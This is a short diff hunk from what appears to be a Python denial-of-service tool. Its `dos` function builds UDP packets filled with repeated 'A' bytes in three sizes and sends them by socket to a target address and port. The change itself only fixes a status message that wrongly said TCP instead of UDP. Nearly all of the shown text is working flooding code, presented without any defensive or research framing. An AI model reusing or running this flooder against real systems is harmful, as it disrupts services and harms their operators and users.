@@ -97,7 +97,7 @@ def dos(target: tuple[str, int], method: str):
         case "udp" | "s-udp" | "l-udp":
             packet = ("A"*1024*24).encode("ascii") if method == "udp" else ("A" * 2048).encode("ascii")
             packet = ("A"*1024*6).encode("ascii") if method == "l-udp" else packet
-            print(f"Sending TCP Packets. Mode: {"Large" if method=="l-udp" else ("Normal" if method=="udp" else "Small")}. Packet size: {packet.__sizeof__()} bytes")
+            print(f"Sending UDP Packets. Mode: {"Large" if method=="l-udp" else ("Normal" if method=="udp" else "Small")}. Packet size: {packet.__sizeof__()} bytes")
             def udp():
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.sendto(packet, (ip, target[1]))
